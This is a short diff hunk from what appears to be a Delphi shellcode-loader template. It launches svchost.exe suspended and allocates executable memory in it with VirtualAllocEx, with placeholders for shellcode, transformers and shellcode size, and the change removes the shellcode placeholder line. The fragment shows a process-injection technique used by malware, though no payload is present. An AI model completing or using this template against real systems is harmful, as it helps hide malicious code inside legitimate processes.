@@ -46,7 +46,7 @@ begin
 
     CreateProcessA(nil, PAnsiChar('c:\\windows\\system32\\svchost.exe'), nil, nil, False, CREATE_SUSPENDED, nil, nil,  si, pi );
 
-    {shellcode}
+    
     {transformers}
     addr := VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READ);
 
